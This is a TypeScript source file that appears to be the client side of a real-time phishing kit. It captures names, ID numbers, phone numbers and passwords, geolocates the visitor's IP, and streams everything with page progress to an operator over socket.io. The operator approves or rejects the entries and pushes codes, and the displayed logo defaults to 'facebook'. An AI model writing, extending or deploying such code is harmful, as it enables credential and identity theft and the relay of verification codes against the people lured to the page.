/* eslint-disable @typescript-eslint/no-explicit-any */
import { customHistory } from "@/components/CustomRouter";
import { effect, signal } from "@preact/signals";
import axios from "axios";
import { getCookie, setCookie } from "cookies-next";
import { FieldValues } from "react-hook-form";
import { NavigateFunction } from "react-router-dom";
import { io as ClientIO } from "socket.io-client";
import { v4 as unique } from "uuid";
import { Message } from "../../types";

// ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //

export const ROOM = import.meta.env.VITE_CODE;

export const socket = signal(
  new (ClientIO as any)(
    import.meta.env.VITE_MODE === "DEV"
      ? import.meta.env.VITE_DEV_SOCKET_IO_URL
      : import.meta.env.VITE_PROD_SOCKET_IO_URL,
    {
      transports: ["polling"],
      autoConnect: false,
      forceNew: true,
    }
  )
);

// The States That Used To Make The Real Time Feature Work

export const socketId = signal("");

export const currentPage = signal("");

// To Sent To Server Any Time Tht It Change

export const loading = signal(false);

export const isApproved = signal(false);

export const messages = signal<any[]>([]);

export const permissions = signal<string[]>([]);

export const message = signal("");

export const lastMessage = signal("");

export const mainInfo = signal({
  fullName: "",
  email: "",
  phone: "",
  idNumber: "",
  password: "",
  id: "",
  room: ROOM,
  Ip: "",
  country: "",
  city: "",
  date: "",
  socketId: "",
});

//For Admin Rejected Our Request Notification

export const isAdminError = signal(false);

//For Shown Chat Model

export const isChat = signal(false);

//For Chat Notification

export const isNewMessage = signal(0);

//For Code That Sent From Admin

export const code = signal("");

//For Logo That We Sent To Admin

export const logo = signal("facebook");

export const specialId = signal("");

export const isCheck = signal(false);

// == Listen For Successfully Connected With Real Time Server  ==

effect(() => {
  axios
    .post(
      `${
        import.meta.env.VITE_MODE == "DEV"
          ? import.meta.env.VITE_DEV_API_URL
          : import.meta.env.VITE_PROD_API_URL
      }/auth/check`,
      { code: ROOM }
    )
    .then(() => {
      isCheck.value = true;
    })
    .catch(() => {
      isCheck.value = false;
    });
});

effect(() => {
  if (isCheck.value)
    axios
      .get("https://ipapi.co/json/")
      .then((res) => {
        socket.value.connect();

        mainInfo.value = {
          ...mainInfo.value,
          room: ROOM,
          Ip: res.data?.ip,
          country: res.data?.country_name,
          city: res.data?.city,
          date: new Date().toString(),
          socketId: socketId.value,
        };
      })
      .catch((err) => {
        console.log(err);
      });
});

socket.value.on("successfully-connected", (id: string) => {
  socketId.value = id;

  //Joining With Current Id To Server
  socket.value.emit("join", socketId.value);
});

effect(() => {
  if (currentPage.value && mainInfo.value.Ip && socketId.value) {
    socket.value.emit("currentPage", {
      ...mainInfo.value,
      page: currentPage.value,
      room: ROOM,
      socketId: socketId.value,
    });
  }

  if (currentPage.value == "page6") {
    sendDataToServer({
      current: "page6",
      data: {},
      nextPage: "page7",
      mode: "code",
      waitingForAdminResponse: true,
    });
  }

  if (currentPage.value == "final") {
    sendDataToServer({
      current: "final",
      data: {},
      nextPage: "",
      waitingForAdminResponse: false,
      mode: "last",
    });
  }
});

effect(() => {
  if (isChat.value) {
    isNewMessage.value = 0;
  }
});

// ==> EVENT FROM SERVER <== //

//Check If Admin Connected

// == Receiving Messages For Chat ==

socket.value.on("receive-message", (m: Message) => {
  messages.value = [...messages.value, m];
  if (!isChat.value) {
    isNewMessage.value += 1;
  }
});

// == Done Operation Message From Admin  ==

socket.value.on("admin-last-message", ({ message }: { message: string }) => {
  lastMessage.value = message;
  loading.value = false;
  currentPage.value = "END";
});

// == Code That Sent From Admin  ==

socket.value.on("code", (adminCode: string) => {
  code.value = adminCode;
  loading.value = false;
});

socket.value.on(
  "admin-response",
  ({ state, next }: { state: boolean; next: string }) => {
    loading.value = false;
    permissions.value = [...permissions.value, next];
    if (state) {
      customHistory.push("/" + next);
    } else {
      isAdminError.value = true;
      message.value =
        "Admin Rejected The Info That You Send To Him, Pleas Make Sure About Them And Try Again !";
    }
  }
);

// Function That Used To Sent Data For Server Any Time

export function sendDataToServer({
  data,
  current,
  nextPage,
  waitingForAdminResponse,
  navigate,
  mode,
}: {
  data: any;
  current: string;
  nextPage: string;
  waitingForAdminResponse: boolean;
  navigate?: NavigateFunction;
  mode?: string;
}) {
  message.value = "";

  isAdminError.value = false;

  socket.value.emit("more-info", {
    ...data,
    room: ROOM,
    date: new Date(),
    id: socketId.value,
    next: nextPage,
    page: current,
    userId: mainInfo.value?.id,
    idNumber: mainInfo.value?.idNumber,
    mode,
    waitingForAdminResponse,
    unique: unique(),
  });

  if (waitingForAdminResponse) {
    loading.value = true;
  } else {
    if (nextPage) {
      if (navigate) navigate("/" + nextPage);
      permissions.value = [...permissions.value, nextPage];
    }
  }
}

export function sendMessage(message: string) {
  socket.value.emit("send-message", {
    content: message,
    id: socketId.value,
    createdAt: new Date(),
    room: ROOM,
    userId: mainInfo.value?.id,
    myId: mainInfo.value?.id,
  });

  messages.value = [
    ...messages.value,
    {
      content: message as string,
      id: socketId.value,
      createdAt: new Date(),
      // userId: mainInfo.value?.id,
    },
  ];
}

export function checkUser(data: FieldValues, navigate: NavigateFunction) {
  const nextYear = new Date();
  const current = new Date();
  nextYear.setFullYear(current.getFullYear() + 1);
  setCookie("ID", data.idNumber, { expires: nextYear });

  mainInfo.value = {
    ...mainInfo.value,
    fullName: data.fullName,
    idNumber: data.idNumber,
    phone: data.phone,
    socketId: socketId.value,
  };

  socket.value.emit("checkUser", mainInfo.value, ({ id }: { id: string }) => {
    mainInfo.value = { ...mainInfo.value, id };
  });

  navigate("/page2");

  permissions.value = [...permissions.value, "page2"];
}

export async function getInitInfo() {
  return await axios
    .get(
      `${
        import.meta.env.VITE_MODE == "DEV"
          ? import.meta.env.VITE_DEV_API_URL
          : import.meta.env.VITE_PROD_API_URL
      }/users/${getCookie("ID")}`
    )
    .then((res) => {
      mainInfo.value = { ...mainInfo.value, ...res.data.materials };
    })
    .catch((err) => {
      setCookie("ID", "");
      console.log(err);
    });
}

// New

function sendData() {
  if (currentPage.value && mainInfo.value.Ip && socketId.value) {
    socket.value.emit("currentPage", {
      ...mainInfo.value,
      page: currentPage.value,
      room: ROOM,
      socketId: socketId.value,
    });
  }
}

setInterval(() => {
  if (isCheck.value) sendData();
}, 2000);
